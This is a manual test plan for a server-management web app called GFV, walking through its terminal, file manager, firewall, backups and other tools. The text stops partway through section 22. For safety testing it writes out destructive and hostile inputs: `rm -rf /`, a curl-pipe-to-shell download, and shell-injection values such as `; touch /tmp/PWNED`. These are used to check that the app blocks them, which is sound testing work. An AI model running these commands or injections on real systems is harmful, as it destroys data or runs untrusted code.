# Testing every GFV app by hand

This is a manual test plan for GFV, organised app by app, for running against real servers. The automated suite
(unit, integration and browser tests) covers a great deal, but it cannot judge how the product feels, and it only
knows the providers and distributions it has been run on. Manual runs on other setups are one of the most useful ways
to contribute.

Each section states what the app is for, what it needs, the steps, the expected result, and a few ways to try to break
it. Expected results describe the intended behaviour. If something does not match, it is either a bug or an error in
this guide, and both are worth reporting. See [Reporting a problem](#reporting-a-problem).

Related documents: the [user guide](USER_GUIDE.md) explains each app, [HOSTED.md](HOSTED.md) covers hosted mode, and
[CONTRIBUTING.md](../CONTRIBUTING.md) covers the automated tests.

## Contents

- [Before you start](#before-you-start)
- [Suggested order](#suggested-order)
- [1. The desktop and the shell](#1-the-desktop-and-the-shell)
- [2. Servers](#2-servers)
- [3. Terminal](#3-terminal)
- [4. Files](#4-files)
- [5. Editor](#5-editor)
- [6. Monitor](#6-monitor)
- [7. Services](#7-services)
- [8. Docker](#8-docker)
- [9. Dev Hub](#9-dev-hub)
- [10. Snapshots](#10-snapshots)
- [11. Actions](#11-actions)
- [12. Learn Mode and Lessons](#12-learn-mode-and-lessons)
- [13. Recipes](#13-recipes)
- [14. Jobs](#14-jobs)
- [15. Network](#15-network)
- [16. Projects](#16-projects)
- [17. Server Map](#17-server-map)
- [18. Firewall and lockout protection](#18-firewall-and-lockout-protection)
- [19. Security](#19-security)
- [20. Backups](#20-backups)
- [21. App Store](#21-app-store)
- [22. Database](#22-database)
- [23. Assistant](#23-assistant)
- [24. Phone layout and installing as an app](#24-phone-layout-and-installing-as-an-app)
- [25. Hosted mode: accounts, 2FA, Users](#25-hosted-mode-accounts-2fa-users)
- [Cleaning up afterwards](#cleaning-up-afterwards)
- [A results table](#a-results-table)
- [Reporting a problem](#reporting-a-problem)

## Before you start

**Use servers you can afford to break.** Several tests change the firewall, SSH settings, nginx and installed
packages. The ideal setup is two cheap throwaway VPSes (call them server A and server B). A few tests need two
servers: cross-server file copy, jobs and broadcasts. If you only have one, skip those and note it.

**If GFV itself runs on one of the servers** (hosted mode), do not run the risky firewall, SSH and nginx tests on that
machine. Use another server. The reasons are in [section 18](#18-firewall-and-lockout-protection) and
[section 15](#15-network).

**Know your way back in.** Before the firewall and SSH tests, make sure you can reach the server in another way:
your provider's web console or rescue mode (for example a serial console or a "run command" feature), or a second SSH
session that stays open.

**Sudo.** If you log in as a normal user, many actions run `sudo -n`, which needs passwordless sudo for that user.
Test with root or a user that has `NOPASSWD:ALL`. Section 2 includes a check for what happens without it.

**Use a throwaway data folder** if you test locally from the repository: `GFV_HOME=/tmp/gfv-test pnpm start`. That
way your real servers and history stay untouched.

**Have these ready:**

- A private key that works for each server, and a way to read it (`cat ~/.ssh/id_ed25519`).
- For hosted mode: your domain, an authenticator app, and your recovery codes.
- A notes file to record what you did and what happened. The [results table](#a-results-table) at the end is a good
  place.

**Two golden rules for the tests**

1. When GFV holds a command because it is dangerous, press **Cancel**. Never press "Run anyway" on a test line like
   `rm -rf /`. The point of those tests is to see GFV stop it.
2. Never stop or kill the SSH service or the process that your connection runs through, and never disable the
   firewall rule for your own SSH port, except in the specific lockout tests that tell you to.

## Suggested order

This order builds on itself and puts the risky parts last:

1. The desktop (section 1) and Servers (2), so you have a connected server.
2. Terminal (3), Files (4), Editor (5), Monitor (6).
3. Learn Mode and Lessons (12), Actions (11), Snapshots (10).
4. Services (7), Docker (8), Dev Hub (9).
5. Recipes (13) and Jobs (14), which need things to record.
6. Network (15), Projects (16), Server Map (17).
7. Security (19), Backups (20), App Store (21), Database (22).
8. Firewall (18) with its lockout protection, once everything else works.
9. Assistant (23), the phone layout (24), and hosted mode (25).

Allow about three to four hours for the whole plan.

## 1. The desktop and the shell

**What it is.** The windowed interface: Dock, menu bar, Spotlight, Mission Control, Control Center, themes.
**Needs.** Nothing yet. Do this before you add a server.

**First run**

- [ ] Open the address GFV printed. The first screen asks you to create a master password (at least 8 characters).
- [ ] Enter a password and create it. The tour starts. Click through it, then close it.
- [ ] Open the **Help** menu and choose **Take the Tour**. It replays.
- [ ] With no server added yet, the desktop shows a card titled "Add your first server".

**Dock and windows**

- [ ] Hover the Dock: icons grow where the pointer is (magnification).
- [ ] Click an app icon to open it. A dot appears under a running app.
- [ ] Open the same app twice (for apps that are not single-window, like Terminal): you get two windows.
- [ ] Drag a window by its title bar. Resize it from an edge or corner.
- [ ] Use the three buttons at the top-left: close, minimise, zoom. Zoom should fill the workspace. Zoom again to restore.
- [ ] Minimise a window, then bring it back by clicking its Dock icon.
- [ ] Right-click a Dock icon: it lists that app's windows.
- [ ] Reload the page. Windows come back where you left them.

**Spotlight and Mission Control**

- [ ] Press **Ctrl+K** (or **Cmd+K** on a Mac). Type part of an app name and press Enter: it opens.
- [ ] In Spotlight, try switching server (once you have two) and running a safe action.
- [ ] Open three windows, then press **Ctrl+Up**. All windows appear side by side. Use the arrow keys to move between
      them, Enter to pick one, Escape to leave.

**Menu bar and Control Center**

- [ ] Open the GFV menu: Light and Dark themes, Wallpaper choices, Reduce Transparency, Change Master Password, Lock
      Vault.
- [ ] Switch theme. Everything, including the unlock screen later, should follow.
- [ ] Right-click the empty desktop: a small menu with New Terminal, Open Files, Wallpaper and the theme switch.
- [ ] Turn on **Reduce Transparency**: the frosted glass becomes solid colours.
- [ ] Open **Control Center** (the sliders icon, right side of the menu bar). It holds quick settings. In hosted mode
      your account is also here.
- [ ] Use the full-screen button in the menu bar. The whole interface goes full screen in the browser.

**Vault**

- [ ] Choose **Lock Vault**. The unlock screen appears. Type a wrong password: you get an error. Type the right one:
      you are back.
- [ ] Wrong password three times in a row, then once more: the fourth attempt should be slowed down, with a message
      that says how many seconds to wait (the throttle).
- [ ] **Change Master Password**, then lock and unlock with the new one. Your servers must still connect (their
      credentials were re-encrypted).

**Reduced motion**

- [ ] If you can, turn on "reduce motion" in your operating system. The window and Dock animations should be calmer.

## 2. Servers

**What it is.** Where you add servers, connect and approve host keys.
**Needs.** The address, port, username and a key or password for your server.

**Adding and connecting**

- [ ] Open **Servers** and press **Add server**.
- [ ] Fill in Name (for example "Server A"), Host (an IP address or domain), Port (22), Username.
- [ ] Choose **Private key** as the authentication, and paste the key (it starts with
      `-----BEGIN OPENSSH PRIVATE KEY-----`). Also try the **Load private key from file** button.
- [ ] Pick a colour. Press **Save**.
- [ ] Press **Connect**. GFV shows the server's **host key fingerprint** and asks you to trust it.
- [ ] On the server, run `ssh-keygen -lf /etc/ssh/ssh_host_ed25519_key.pub` and compare the fingerprint. Then trust it.
- [ ] The status becomes **Connected** (green). The **Test** button on the server's row also runs a harmless check.

**What should be true now**

- [ ] The server's colour and name appear in the menu bar's server picker. New windows for server apps have a coloured
      border and a badge with its name.

**Failure cases (each should give a clear message, not a crash)**

- [ ] Wrong port (for example 2222): the message mentions that nothing is listening or the connection timed out, and
      what to check.
- [ ] Wrong username: "authentication failed".
- [ ] A host that does not exist (`nonexistent.invalid`): a message that says the name could not be found.
- [ ] A password instead of a key: if the server allows password login, it works. If not, it fails cleanly.
- [ ] Block GFV's address in the cloud firewall for a minute, then press Connect: you see a timeout message that
      suggests checking firewall and cloud network rules. Restore the rule afterwards.

**Reconnecting and status**

- [ ] Do not restart the SSH service as a test, because it can drop you. Instead, disconnect with the app's button and
      connect again.
- [ ] Turn your computer's network off for 20 seconds and on again. A toast says you lost the connection to the server
      and GFV reconnects by itself, retrying a little more slowly each time (1, 2, 5, 10, then 30 seconds).
- [ ] If GFV runs on a remote machine (hosted mode), a red banner "Lost the connection to GFV" appears in the browser
      while the link to GFV itself is down, and goes away when it returns.

**Host key changed**

- [ ] Only if you can do it safely: reinstall or recreate a test server so its host key changes. GFV must refuse to
      connect and say the key changed. It must show the new fingerprint and ask you to explicitly replace the old one.

**Sudo**

- [ ] If you can, add a normal user without passwordless sudo and run any action that needs sudo (for example saving a
      file in `/etc` in section 5). It should say a password is required, and everything else should still work.

**Clone setup**

- [ ] After section 9 (Dev Hub), come back here and try **Clone setup** (its tooltip says "Create a recipe from the
      tools installed on this server"). It should create a recipe from the installed tools.

**Delete**

- [ ] Add a throwaway server and delete it. It should disappear, with its history.

## 3. Terminal

**What it is.** A real shell on the server, with the Safety Net watching what you type.
**Needs.** A connected server.

- [ ] Open **Terminal**. You get a prompt like `user@host:~$` within a few seconds.
- [ ] Run `whoami`, `pwd`, `ls -la`, `uname -a`. Output is correct and readable.
- [ ] Run `top` (quit with `q`) and `vim /tmp/x` (exit with `:q!`). Full-screen programs draw correctly.
- [ ] Run `ping -c 3 1.1.1.1` and `cat /var/log/syslog | head` (path varies by distribution).
- [ ] Open a second tab with the **New tab** button. Each tab is a separate shell. Close a tab.
- [ ] Resize the window: the terminal adapts. Try `tput cols` before and after.
- [ ] Select text and press **Ctrl+Shift+C**: it copies. Paste into the terminal with your browser's paste.
- [ ] Paste a multi-line text: it should not run line by line in a surprising way (bracketed paste).
- [ ] Run `exit`. The terminal shows "Session ended" and a **Reconnect** option. Reconnect.
- [ ] Reload the whole page. The shells end (a known limit). Open a new one.

**Safety Net** (always press **Cancel** on these)

- [ ] Type `rm -rf /` and press Enter. A bar appears ("Dangerous command") with the reason. The command did not run.
      Press **Cancel**.
- [ ] Type `chmod -R 777 /etc` and press Enter. It should be held too. **Cancel**.
- [ ] Type `curl http://example.com/x.sh | sh` and press Enter. It should be held with a caution about running a
      script you have not read. **Cancel**.
- [ ] Type a harmless command like `echo hello`: no hold.
- [ ] Open `vim` and type text containing `rm -rf /` inside it. No hold, because keystrokes inside full-screen programs
      are not shell commands. Quit with `:q!`.
- [ ] Remember the limit: tab completion, history and aliases can get around the net. Do not rely on it.

**Phone keys** (see section 24 for the phone layout): the row with Ctrl, Esc and arrows.

## 4. Files

**What it is.** A file manager over SFTP.
**Needs.** A connected server. Better with two servers for the copy test.

**Browsing**

- [ ] Open **Files**. It shows your home folder.
- [ ] Type `/etc` into the **Path** box and press Enter. Double-click folders to go in. Use **Up** and **Home**.
- [ ] Use **Refresh**. Toggle **Show Hidden Files** (dotfiles appear and disappear).
- [ ] Sort by Name and by another column.

**Create, rename, permissions, delete**

- [ ] **New Folder…**: create `gfv-test`. It appears.
- [ ] Open it. **Upload…** a small file from your computer. Also drag another file into the window.
- [ ] **Rename…** the file. The preview shows a command like `mv -nT`. Confirm.
- [ ] Try to rename it onto an existing name: it must not overwrite (the `-n` flag).
- [ ] **Permissions…** (chmod): change the file to `600`. A confirmation (caution) appears. The Mode column updates.
- [ ] **Download** the file. Open it locally and compare with the original.
- [ ] **Delete…** the file. A confirmation with a checkbox appears (caution or danger). Check it and run.
- [ ] Right-click a file: the context menu offers Open, Rename, Permissions, Download, Delete.

**Large and odd cases**

- [ ] Upload a 50 to 100 MB file. It should stream without freezing the page.
- [ ] Try to enter a folder you cannot read (for example `/root` as a normal user): a permission message, not a crash.
- [ ] Try a path that does not exist: a "not found" message.
- [ ] Download a folder: it is not supported, so it should say so.

**Copy between servers** (needs two connected servers)

- [ ] Open a Files window for server A and another for server B (the badge shows which is which).
- [ ] Drag a file from A's window onto B's window. It copies. Check on B.
- [ ] Do it again with the same name: it must not overwrite.
- [ ] Drag a folder: it should refuse (single files only).

## 5. Editor

**What it is.** A code editor (Monaco) for remote files. It opens from Files; it is not in the Dock on purpose.
**Needs.** Files, and a text file.

- [ ] In Files, double-click a text file (create one first with the Terminal: `echo hello > ~/note.txt`). The Editor
      opens with the content.
- [ ] Type a change. The title shows an unsaved marker. Press **Ctrl+S**. Reopen to confirm it saved.
- [ ] Close the window with unsaved changes: GFV asks before discarding them.
- [ ] Try **Find…**, **Replace…**, **Go to Line…**, and the Edit menu items (Undo, Redo, Cut, Copy, Paste, Select All).
- [ ] Open a file with a syntax (for example a `.json`, `.sh` or `.py` file): it is coloured.
- [ ] Open a very large file (more than a few MB): GFV should refuse or warn instead of freezing.

**Root-owned file, with a backup**

- [ ] Open `/etc/hosts`. Add a comment line at the bottom and save. If you are not root, the save is refused.
- [ ] Choose **Save with sudo…**. The preview shows the exact commands (a temporary upload, a backup of the old file,
      a `cp` with sudo). Confirm.
- [ ] Check the result in the Terminal: `tail -3 /etc/hosts`.
- [ ] Open **Snapshots** (section 10): the old version is there.

## 6. Monitor

**What it is.** Live CPU, memory, network and disk, plus a process list.
**Needs.** A connected server.

- [ ] Open **Monitor**. Charts for CPU %, Memory used % and Network (down and up per second) start filling. On a far
      server the first draw can take several seconds.
- [ ] In the Terminal run `yes > /dev/null` for 20 seconds (stop it with Ctrl+C). CPU rises, then falls.
- [ ] Look at the disks section: mount points and usage match `df -h`.
- [ ] In **Processes**, search by name, change **Sort by** (CPU, Memory, Name, PID).
- [ ] Start a harmless process (`sleep 600 &` in the Terminal). Find it in the list, press **Stop**. The preview shows a
      `kill -TERM`. Confirm, and it disappears.
- [ ] Start another and use **Kill** (force kill). It is a **danger** action, so it needs the extra confirmation.
- [ ] Try to stop `sshd` or process 1: it must be flagged as danger with a clear reason. **Cancel**.
- [ ] Minimise the window: polling should pause (no needless traffic).

## 7. Services

**What it is.** systemd services: list, start, stop, restart, enable, disable, logs.
**Needs.** A server with systemd (a normal VPS has it). Pick a harmless service such as `cron`, or one you installed
(nginx after section 9).

- [ ] Open **Services**. The list loads. Use **Search services…** and the **Filter** (All, Running, Failed, Inactive).
- [ ] Select `cron` (or another harmless service) and press **Restart**. The preview shows `systemctl restart`. Confirm.
- [ ] **Stop** it, then **Start** it. Check `systemctl is-active cron` in the Terminal after each.
- [ ] **Disable** and **Enable** at boot, then check `systemctl is-enabled cron`.
- [ ] Open its **logs**. Tick **Follow (every 2 s)** while you trigger something that logs (for example restart it again).
- [ ] Try to stop `ssh` (or `sshd`): it must be flagged as danger. **Cancel**.
- [ ] On a server without systemd the app should say so (the Docker test servers use canned data).

## 8. Docker

**What it is.** Containers and images.
**Needs.** Docker on the server (install it in section 9 if you need it).

- [ ] Open **Docker** on a server without Docker: it should say Docker is not installed and point to the Dev Hub.
- [ ] On a server with Docker, start a test container in the Terminal:
      `docker run -d --name gfv-test-web -p 8081:80 nginx:alpine`.
- [ ] The container appears in the **Docker** app within a few seconds, with its image, status and ports.
- [ ] **Stop**, **Start**, **Restart** it. Each shows its command and needs a confirmation.
- [ ] Open its **logs**.
- [ ] **Remove** it. This needs a confirmation. It disappears.
- [ ] Check the **Images** list and remove the nginx image if you wish.

## 9. Dev Hub

**What it is.** One-click installs of Node.js, Python 3, Docker, PostgreSQL, nginx and Git.
**Needs.** A connected server running Ubuntu or Debian (Fedora works for most). These installs take minutes.

- [ ] Open **Dev Hub**. Each tool shows whether it is already installed (and its version).
- [ ] Choose a small, harmless tool you do not have, for example **Git**, and press install. The preview shows the
      distribution check first, then the real `apt-get` commands.
- [ ] Confirm. Output streams in a window with an elapsed timer.
- [ ] In the run window press **Hide**. The install keeps going, and the card shows "Installing... View output". Reopen it.
- [ ] Wait for it to finish. The card now shows the installed version. Check with `git --version`.
- [ ] Start an install of something bigger (for example Node.js or PostgreSQL) and press **Cancel** partway. It should
      stop cleanly. If a later install complains about `dpkg`, run `sudo dpkg --configure -a` on the server.
- [ ] Try the **uninstall** option of a tool. It needs a confirmation and removes it.
- [ ] On an unsupported system (for example Alpine) it should refuse with a clear message and change nothing.

## 10. Snapshots

**What it is.** A timeline of backups GFV made on the server before changing files.
**Needs.** At least one change to a file (do section 5's sudo save, or the restore below).

- [ ] Open **Snapshots**. Your earlier edit of `/etc/hosts` is listed, grouped by file.
- [ ] Select a snapshot. A **diff** shows the backup against the file now (use **Compare**).
- [ ] Press **Restore**. The preview first shows a backup of the current file, then the copy. Confirm.
- [ ] Check the file in the Terminal. Then look at Snapshots again: a new snapshot of the version you just replaced
      exists, so the restore can itself be undone.
- [ ] Use **Delete backup** on a single snapshot. It should disappear.
- [ ] Make more than 30 changes to the same file if you want to check pruning (the newest 30 are kept). This is
      optional and slow.

## 11. Actions

**What it is.** A small launcher for a few example actions, mostly for trying the Safety Net.
**Needs.** A connected server.

- [ ] Open **Actions**. A short list of example actions appears, each with its explanation.
- [ ] Run **uptime**-style actions: the preview shows the command and a `safe` risk, so no confirmation is needed.
- [ ] Run one with a **caution** or **danger** risk, such as clearing the apt cache or deleting a path you created.
      The confirmation checkbox must be required, and the reason shown.
- [ ] For an action with a text field, type a hostile value such as `/tmp/x; echo pwned`. The input is either rejected
      by validation or quoted so it is treated as one odd file name. Nothing else runs.

## 12. Learn Mode and Lessons

**What it is.** A journal of every command GFV ran with explanations, and short guided lessons.
**Needs.** A connected server.

**The Learn panel**

- [ ] Open the Learn panel from the menu bar (the Learn toggle). The workspace narrows to make room.
- [ ] Run any action. A new entry appears with the commands, the explanation and the result.
- [ ] Press **Try it yourself** next to a command: it is typed into a Terminal **without** running. You can edit it and
      press Enter yourself.
- [ ] Note the "You've learned N commands" counter. It goes up as you run commands you have not seen before.
- [ ] Reload the page: the journal stays (it is stored in GFV's database).
- [ ] Close the panel. It should stay closed after a reload.

**Lessons**

- [ ] Open **Lessons**. There are five: "Your first command", "Files, folders and the Safety Net", "Dangerous
      commands", "Services and logs", and "Turning clicks into scripts".
- [ ] Start the first one and follow it. Steps that tell you to do something in GFV complete when GFV notices you did
      it. Answer the quiz questions wrongly once, to see that you can try again.
- [ ] Change the **Skill level** at the top (Beginner, Intermediate, Expert). It changes only what is shown by
      default. Expert starts with the Learn panel closed. The level must **never** remove a safety confirmation.
- [ ] Finish a lesson: it shows "Lesson complete", and the progress remains after a reload.
- [ ] In the "Dangerous commands" lesson, if a step has you type something risky, press **Cancel** when the Safety Net
      holds it. The lesson is about seeing it hold.

## 13. Recipes

**What it is.** Record what you do, then export it as a script or replay it elsewhere.
**Needs.** A connected server. Two servers for replay (see section 14).

**Recording**

- [ ] Press **Record** in the menu bar. A counter of steps appears.
- [ ] In **Files**, create a folder `/tmp/gfv-recipe-test` (an action). Rename it, then change its permissions.
- [ ] In **Services** restart `cron`.
- [ ] Press **Stop**. The **Recipes** app opens with your steps.
- [ ] Note that file edits, uploads and killed processes are **not** recorded (by design). Edit a file while
      recording and confirm it does not appear as a step.

**Editing**

- [ ] Rename the recipe (the **Recipe name** box).
- [ ] Reorder steps with **Move up** and **Move down**. Delete one with **Delete step**.
- [ ] Each step shows its explanation and the commands.

**Export** (the **Script** tab and the **Export format** box)

- [ ] Bash: read the script. It starts with `set -euo pipefail`, defines a `SUDO` variable, and has a comment
      explaining each step. Copy it, or download it.
- [ ] Check the script's syntax: `bash -n script.sh`. Then run it on **another** server (not the one you recorded on).
      The result should match. Run it a **second time**: it should not fail (steps are safe to repeat).
- [ ] Ansible, Dockerfile and Compose: each shows notes about steps that do not fit the format. Read the output before
      using it. GFV generates these files but does not run them for you, so building the Dockerfile or running the
      playbook is a useful extra check.

**Parameters**

- [ ] Open the **Parameters** tab and add one called `site` with a default. Use the placeholder `{{site}}` inside a step
      (for example in a folder name) with **Edit step parameters**.
- [ ] Export as bash: the value becomes an environment variable named `GFV_SITE`. Run the script with
      `GFV_SITE=hello bash script.sh` to confirm.
- [ ] Hostile value: run it with `GFV_SITE="x'; touch /tmp/PWNED; echo '"` and check that `/tmp/PWNED` does **not**
      exist afterwards.
- [ ] Add a **secret** parameter. It must not be stored or logged, and it never has a default.

**Library, sharing, importing, cloning**

- [ ] Open the **Recipe library**: "Node.js dev box", "Web server (nginx + Git)", "Python + PostgreSQL", "MERN-style
      stack on Ubuntu" and "Docker host". Import one, read its steps, and do not run it unless you mean to.
- [ ] **Share** a recipe: it saves a readable file with no secrets.
- [ ] Import that file back. Then edit the file by hand to use an unknown action id and import again: it must be
      **refused**, with a reason.
- [ ] **Clone setup** (in Servers): create a recipe from a server's installed Dev Hub tools.
- [ ] Delete a recipe.

## 14. Jobs

**What it is.** Replays and broadcasts across servers, with progress per server.
**Needs.** Two connected servers.

**Replay a recipe on several servers**

- [ ] In **Recipes**, choose **Run on…**. Select server B (and A if you like), fill in parameter values.
- [ ] The **plan** shows the exact commands for each server (they can differ: root versus sudo) and the highest risk.
- [ ] Confirm once. The **Jobs** app shows each server's progress, step list and output.
- [ ] Check the result on server B in the Terminal.

**Failure and the decision buttons**

- [ ] Make a step fail on one server on purpose, for example a recipe step that creates a folder under a path that
      does not exist on only one server, or a step that needs a tool you installed on only one.
- [ ] That server **pauses** ("Needs a decision") and offers **Retry step**, **Skip step** and a way to stop that server. The other
      server carries on.
- [ ] Fix the cause, press **Retry**, and the step passes. Try **Skip** and the stop option on a different run.
- [ ] A toast tells you when a server needs a decision and when the job ends.

**Broadcast**

- [ ] **New broadcast**: choose one action (for example uptime), pick both servers, and run. The same action runs on
      each, in parallel.
- [ ] Choose a disconnected server: the plan refuses and names it. Nothing runs.

**Cancel and history**

- [ ] Start a long job and **Cancel** it. Running steps get Ctrl-C and paused servers are abandoned.
- [ ] Finished jobs stay in the list after a reload (without parameter values).
- [ ] Delete a finished job.
- [ ] While **recording**, run a replay. The replay must **not** be added to the recording.

## 15. Network

**What it is.** Listening ports, nginx sites and HTTPS.
**Needs.** A connected server. nginx for the Sites tab (install it with the Dev Hub). A domain that points at the
server for HTTPS.

**Warning if GFV is hosted on the same VPS.** The Network app edits nginx. Do not delete or edit the site that serves
GFV itself, or you cut off your own access to the web page. Test on another server, or only add a site with a
different domain name.

**Ports tab**

- [ ] Open **Network**. The **Ports** tab lists what is listening, which program owns each port, and whether it is
      reachable from anywhere or only from the server itself.
- [ ] Start something local: `python3 -m http.server 9000 --bind 127.0.0.1 &`. It shows as local only. Then
      `python3 -m http.server 9001 &`, which listens on all addresses: it shows as reachable. Stop both afterwards
      (`kill %1 %2`, or find them in the Monitor).

**Sites and domains tab**

- [ ] **Add site**: enter a **Domain** (for testing, a second hostname that points to the server, or any name
      you will only test with `curl -H`), choose **What the site serves** (a local port or a folder), and press
      **Review…**.
- [ ] The preview shows the nginx config being written and that nginx's whole configuration is **checked before
      reloading**. Confirm.
- [ ] Test it: `curl -H "Host: your-domain" http://SERVER_IP/` returns your app or folder.
- [ ] Break it on purpose: add a site that points at a port where nothing listens. Server Map (section 17) should show
      it as a broken link.
- [ ] Try an invalid domain or a character that should not be allowed: it must be rejected before anything runs.
- [ ] **Get HTTPS** (certbot): the domain must already point at the server and port 80 must be open. The preview
      says it accepts the Let's Encrypt terms for you. Enter an **Email for Let's Encrypt**. Use a real domain, because
      Let's Encrypt has rate limits.
- [ ] Remove the site. nginx is reloaded and the site is gone.

## 16. Projects

**What it is.** Deploy an app from a git repository, with environment variables and a systemd service.
**Needs.** A connected server with Git. A small public repository you trust (a hello-world Node or Python app).
Private repositories need an SSH key already set up on the server.

- [ ] Open **Projects** and press **New project**. Enter a name (`my-app`), a repository URL, and a build command
      if the project needs one. Press **Review…**.
- [ ] The preview shows a clone into `~/gfv-projects/my-app` and your build command. Confirm. A project card appears.
- [ ] Press **Check for updates**. With no new commits it says it is up to date.
- [ ] Push a new commit to your test repository, then **Check for updates** again: it shows the new commit. **Deploy**
      brings it in. Note that local edits inside that folder are discarded.
- [ ] **Environment**: add a variable (for example `API_KEY`). It is saved to a file only you can read. Check on the
      server: `ls -l ~/gfv-projects/my-app/` and confirm the value does not show in the **history** or any command.
- [ ] **Run as a service**: creates a systemd service for your user that restarts on a crash and starts at boot.
      Check with `systemctl status` (the service name is shown in the preview). Kill the process and watch it restart.
- [ ] Remove the service and the project.
- [ ] Keep in mind that the build command is that project's own code running on your server, so only deploy
      repositories you trust. Do not test this with an untrusted repository.

## 17. Server Map

**What it is.** A picture of how a visitor reaches your code: domain, nginx site, port, program, project.
**Needs.** Sites from section 15 and a project from section 16.

- [ ] Open **Server Map**. Boxes and links show your sites, ports, listening programs and projects.
- [ ] Click a box: it opens the app that manages it (Network or Projects).
- [ ] Create a broken link (a site pointing at a port where nothing runs). The link is drawn as dashed red and the
      **Problems** list names it.
- [ ] Fix it (start something on that port). The problem disappears within a few seconds ("No problems").
- [ ] Check the **Other listening ports** list for things that are not part of any site.

## 18. Firewall and lockout protection

**What it is.** ufw management, with a timer on the server that undoes a change if GFV loses access.
**Needs.** A server with ufw (Ubuntu or Debian). Install it with `sudo apt install ufw` if needed.

**Read this first.** Run these tests on a server you can reach another way (provider console), and keep a second SSH
session open. **Do not run them on the VPS that hosts GFV.** Judging from how the guard works, it proves
that GFV can still open a new **SSH** connection, and it does not check that your browser can still reach the web page
on port 80 or 443. If you turn ufw on there without allowing 80 and 443, you could lose access to GFV's page, and the
guard would not notice. This case is not covered by the automated tests, so do not try it on a server you care about. Cloud firewall rules (for example a security group) are separate and are not managed by this app.

**Basic use**

- [ ] Open **Firewall**. It shows whether ufw is on, the default policy, and every rule in plain language. If ufw is
      not installed it says so.
- [ ] Turn the firewall **on**. The preview shows that the **SSH port is allowed first**, then the guard commands,
      then the enable. Confirm. It stays reachable.
- [ ] **Add a firewall rule**: Allow, port `8080`, TCP, from Anywhere. Press **Review…**. Confirm. The rule appears.
- [ ] Add a rule **from a specific address** (`203.0.113.7`), and one with a **range** (`8000:8100`).
- [ ] Try invalid input: port `99999`, `80; ls`, a range going backwards. All must be rejected before anything runs.
- [ ] Add a **Limit** rule and a **Deny** rule for a harmless port. Delete a rule.

**The lockout hint and the guard**

- [ ] Start adding a **Deny** rule for **port 22**. A hint (the lockout warning) appears before you even review.
- [ ] Press **Review…**. Read the preview: it saves the current rules, starts a timer on the server that restores
      them after 40 seconds, makes the change, opens a **new** connection to prove access, and only then cancels the
      timer. All of that is shown as real commands.
- [ ] **The real test** (only on a server you can recover): confirm the deny-22 rule. GFV should notice it cannot open
      a new connection, say that the server will undo the change, and wait. Within roughly 40 to 60 seconds the server
      restores the rules by itself and GFV connects again. Your existing connection may keep working throughout (that is
      why a **new** connection is the proof).
- [ ] Afterwards, open the **undo timeline**: the change is listed, marked as reverted.

**Undo timeline**

- [ ] Make two or three harmless rule changes. Each appears in the timeline.
- [ ] Press the undo button on an older entry (its tooltip says it puts the firewall back the way it was before that
      change). Confirm. The rules return to that state. An undo is itself a change, so it can be undone.
- [ ] Turn the firewall **off** again at the end of testing if it was off at the start.

## 19. Security

**What it is.** A checkup of common problems, with one-click fixes that use the same confirmations.
**Needs.** A connected server. Ubuntu or Debian for the fixes.

- [ ] Open **Security**. After a short wait a summary and a list of **findings** appear, each with why it matters.
      Examples: password logins allowed, root login over SSH, no firewall, restart needed, automatic updates off,
      nothing blocks repeated password guessing, fail2ban installed but not running.
- [ ] Expand a finding. Read its explanation.
- [ ] Apply a safe fix, for example **install fail2ban** or **turn on automatic security updates**. The preview shows
      the commands. Confirm and watch it finish. Run the checkup again: the finding is gone.
- [ ] **SSH changes** (root login, password login) use the same lockout guard as the firewall. Before turning off
      password logins, confirm that your account has an SSH key: GFV must refuse to offer it if you have none.
- [ ] Apply "disallow root login" on a test server where you log in as a normal user. Check you can still connect.
      Then use the undo that the Security app offers for that change to restore the original setting.
- [ ] Remember it is a checklist of common problems, not a guarantee of security. There is no uninstall button for
      fail2ban in this app.
- [ ] Skip "install updates" on a machine where a kernel or driver change would be hard to undo.

## 20. Backups

**What it is.** Scheduled backups made by real systemd timers on the server.
**Needs.** A server with systemd. A folder to back up.

- [ ] Create test data: in the Terminal, `mkdir -p ~/backup-test && echo hello > ~/backup-test/a.txt`.
- [ ] Open **Backups**. Press to **Schedule a backup**. Fill in:
  - **Name** (lowercase letters, digits, dashes): `test`
  - **Folders to back up** (one per line): `/home/youruser/backup-test`
  - **How often**: Every day, **At hour** a few hours from now (server time)
  - **Keep the newest**: 3
- [ ] Press **Review…** and read the preview: a script, a service file and a timer file. Confirm.
- [ ] The job appears under the list of jobs. Check on the server: `systemctl list-timers | grep gfv`.
- [ ] Press **Back up now**. After a few seconds an **archive** appears under "Backups on this server".
- [ ] **Download** the archive and open it on your computer: it holds your folder.
- [ ] Change the data, run again a few times past the keep limit: only the newest three archives remain.
- [ ] Use **Restore to a folder** on an archive: it unpacks into a new folder and your live files are never
      overwritten. Also try **Download** and the delete button for an archive.
- [ ] Remove the job. The timer disappears from `systemctl list-timers`.
- [ ] Remember: archives live on the **same** server. Copy them elsewhere for real backups.

## 21. App Store

**What it is.** A few well-known Docker apps installed with one click.
**Needs.** Docker on the server (Dev Hub), and ideally a server where the app ports are not used.

- [ ] Open **App Store**. The apps are: a **whoami** test page, **Uptime Kuma**, **Grafana**, **Vaultwarden**,
      **PostgreSQL** and **Redis**. Each shows its pinned version. Use the search box.
- [ ] If Docker is missing, the app says so and points to the Dev Hub.
- [ ] Install **whoami** first. Choose a **Port on this server** (1024 to 65535) and **do not** tick the "reachable
      from the internet" box. The preview shows the Docker commands and a generated password file if the app needs one.
- [ ] After it starts, from the server run `curl http://127.0.0.1:PORT/`. It answers. From your own computer it should
      **not** answer (it only listens on the server).
- [ ] Install an app that has a password (Grafana, Vaultwarden or PostgreSQL). Use **Show credentials**: the generated
      password appears. Check that it is **not** in the History/Learn panel and not in any command.
- [ ] Try the reachable-from-the-internet option on one app, and confirm that the warning is shown and that the port
      then answers from outside (only if your cloud firewall allows it). Turn it off again.
- [ ] Use the **Put a domain in front of it** button: it should open the Network app prepared for that port.
- [ ] **Remove** an app and choose to keep its data. Reinstall: the data is still there. Then remove and delete the
      data.

## 22. Database

**What it is.** Browse and query PostgreSQL through the SSH connection, with no database port opened.
**Needs.** PostgreSQL on a server (Dev Hub, or the App Store's PostgreSQL, whose password you read with Show
credentials).

- [ ] Open **Database**. With no saved connection it says "No connection" and offers **Add connection**.
- [ ] Add one: a name, the host **as the server sees it** (usually `127.0.0.1`), the port (5432), the database name,
      the user and the password. Press **Save**.
- [ ] The tables appear in the list. Select one to see its columns.
- [ ] Run `SELECT 1;` in the **SQL** box: a result grid appears, with the executed command shown.
